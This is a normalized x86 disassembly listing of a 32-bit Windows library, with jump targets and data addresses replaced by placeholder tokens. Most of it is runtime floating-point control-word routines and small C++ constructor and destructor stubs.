jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1002625f
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_100262ed
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1002638d
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1002625f
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_100262ed
push eax
mov [ ebp - 0xc ] eax
call sub_1002686a
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_1002669c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_1002686a
push 0x8
push r--data
call sub_10018984
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_100189c9
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_10001000
mov [ ecx ] r--data
jmp sub_100108d3
sub_1000100b
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100108d3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000102d
retn
sub_1000102e
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10010bad
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1000109b
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_1000197b
mov ecx esi
pop esi
jmp sub_100108d3
sub_100010b8
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_100010c6
push esi
mov esi ecx
call sub_1000109b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_100010e2
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001066
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100010fa
mov [ ecx ] r--data
jmp sub_1000109b
sub_10001105
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000109b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_100015e0
xor eax eax
inc eax
retn
sub_1000166c
push 0x8
push r--data
call sub_10018984
and [ ebp - 0x4 ] 0x0
call sub_100015f4
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100189c9
retn
sub_10001683
xor eax eax
inc eax
retn
sub_10001704
push 0x0
push 0x1
call sub_1000197b
retn
sub_1000175c
push 0x0
push 0x1
call sub_10001a52
retn
sub_10001838
mov esi [ ebp + 0x8 ]
call sub_10001b71
xor ebx ebx
push ebx
push ebx
call sub_10013de1
int3
sub_1000184a
push esi
mov esi eax
call sub_10001b71
push [ esi ]
call sub_10010ba2
pop ecx
pop esi
retn
sub_100018c3
push [ eax ]
call sub_10010ba2
pop ecx
retn
sub_10001b71
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
retn
push [ esi + 0x10 ]
call sub_10001e51
push [ esi + 0xc ]
call sub_10010ba2
pop ecx
sub_10001e05
cmp [ eax + 0x18 ] 0x8
mov [ eax + 0x14 ] ecx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
xor edx edx
mov [ eax + ecx * 2 ] dx
retn
sub_10002147
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001127
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000222c
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_1000197b
push esi
push esi
call sub_10013de1
int3
sub_100022d5
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_10002393
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_10002342
mov esi [ ebp + 0x8 ]
xor edi edi
push edi
push 0x1
call sub_10001a52
push edi
push edi
call sub_10013de1
int3
sub_100023dd
add eax eax
push eax
push [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
call sub_10010bad
mov eax [ esp + 0x14 ]
add esp 0x10
retn
sub_10002467
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10010876
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100024af
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x1
call sub_10001a52
add esi 0x1c
push 0x0
call sub_10013de1
call sub_100142eb
retn
sub_10002637
xor eax eax
inc eax
retn 0x4
sub_10002752
push esi
mov esi ecx
call sub_1000276e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10002802
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push 0x0
call sub_1000a62e
mov eax [ ebp + 0x8 ]
pop ecx
leave
retn
sub_1000295f
push 0x28
mov eax sub_1002845c
call sub_100142b2
and [ ebp - 0x4 ] 0x0
mov esi ecx
mov [ ebp - 0x34 ] esi
call sub_10002ac3
or [ ebp - 0x4 ] 0xffffffff
jmp sub_1000298c
sub_1000297f
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10002bac
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x28 ] 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax r-xdata
retn
xor ebx ebx
push ebx
push ebx
call sub_10013de1
sub_10002d01
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_1000398f
push esi
mov [ esi ] r--data
call sub_1000fec1
pop ecx
pop esi
retn
sub_10002e6b
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
sub_10002ed8
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
sub_1000305f
add eax 0x4
jmp sub_1000863f
sub_1000314f
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_10003fba
push esi
mov [ esi ] r--data
call sub_1000fec1
pop ecx
pop esi
retn
sub_10003212
push esi
mov esi eax
add esi 0xc4
mov ecx esi
call sub_10009fad
mov [ esi ] r--data
pop esi
retn
sub_10003510
call sub_1000295f
xor eax eax
retn
sub_100039c7
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0xc
push eax
call sub_100048e4
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100039e2
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_100046fe
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_10002d01
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000474e
push esi
mov esi ecx
call sub_10003a0d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000479b
push esi
mov esi ecx
call sub_10003ff9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_100047b7
push edi
mov edi eax
push 0x0
mov ecx edi
mov [ edi + 0x18 ] 0xf
call sub_10001ca7
push 0x0
call sub_1000530f
mov eax edi
pop edi
retn
sub_100052b3
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x1c
sub_100052cd
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x10
sub_100052dd
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
cmp [ esp + 0x10 ] eax
jae r-xdata
retn 0x10
mov eax [ esp + 0x10 ]
sub_100052f2
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10005437
mov eax [ eax + 0x38 ]
mov ecx [ eax ]
mov [ esi ] ecx
call sub_100086fb
mov eax esi
retn
sub_1000559b
xor ecx ecx
mov eax esi
mov [ esi + 0x18 ] 0x7
call sub_10001e05
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx esi
call sub_10001d21
mov eax esi
retn 0x8
sub_1000601f
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10006036
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10006079
mov ax [ ecx + 0xc ]
retn
sub_1000607e
mov ax [ ecx + 0xe ]
retn
sub_10006083
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100016bc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000609d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ecx + 0x10 ]
mov esi [ ebp + 0x8 ]
call sub_1000170e
mov eax esi
pop esi
leave
retn 0x4
sub_100060b8
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ecx + 0x14 ]
mov esi [ ebp + 0x8 ]
call sub_1000170e
mov eax esi
pop esi
leave
retn 0x4
sub_100060d3
push esi
mov esi ecx
call sub_1000604d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10006363
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000727e
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10013de1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100072e1
mov ecx [ ecx + 0xc ]
test ecx ecx
